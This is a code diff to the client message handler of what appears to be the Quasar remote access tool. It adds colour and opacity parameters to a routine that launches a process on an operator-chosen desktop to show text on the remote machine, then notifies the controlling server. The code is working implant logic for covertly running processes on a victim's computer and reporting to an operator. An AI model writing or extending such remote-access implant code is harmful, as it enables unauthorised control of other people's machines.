@@ -116,6 +116,10 @@ namespace Quasar.Client.Messages
                 int nStartY = message.StartY;
                 int nEndX = message.EndX;
                 int nEndY = message.EndY;
+                uint nTxtColor = message.TextColor;
+                uint nBkColor = message.BackGroundColor;
+                bool bBkExist = message.ExistBackgroundColor;
+                int nAlpha = message.Opacity;
                 try
                 {
                     NativeMethods.STARTUPINFO structure = default(NativeMethods.STARTUPINFO);
@@ -138,9 +142,9 @@ namespace Quasar.Client.Messages
                     string strDesktop = ((Networking.Client)client).curDesktopName;
 
                     structure.lpDesktop = strDesktop;
-                    if (!NativeMethods.CreateProcess(null, string.Format("\"{0}\" \"{1}\" \"{2}\" \"{3}\" \"{4}\" \"{5}\" \"{6}\"", text10, text9, num, nStartX, nStartY, nEndX, nEndY), IntPtr.Zero, IntPtr.Zero, false, 0U, IntPtr.Zero, null, ref structure, out process_INFORMATION))
+                    if (!NativeMethods.CreateProcess(null, string.Format("\"{0}\" \"{1}\" \"{2}\" \"{3}\" \"{4}\" \"{5}\" \"{6}\" \"{7}\" \"{8}\" \"{9}\" \"{10}\"", text10, text9, num, nStartX, nStartY, nEndX, nEndY, nTxtColor, bBkExist, nBkColor, nAlpha), IntPtr.Zero, IntPtr.Zero, false, 0U, IntPtr.Zero, null, ref structure, out process_INFORMATION))
                     {
-                        Process.Start(text10, string.Format("\"{0}\" \"{1}\" \"{2}\" \"{3}\" \"{4}\" \"{5}\"", text9, num, nStartX, nStartY, nEndX, nEndY));
+                        Process.Start(text10, string.Format("\"{0}\" \"{1}\" \"{2}\" \"{3}\" \"{4}\" \"{5}\" \"{6}\" \"{7}\" \"{8}\" \"{9}\"", text9, num, nStartX, nStartY, nEndX, nEndY, nTxtColor, bBkExist, nBkColor, nAlpha));
                         if (!flag7)
                         {
                             client.Send(new NotifyMessageToServer { Message = string.Format("{0}","Invisible text showed (on Default desktop)!") });
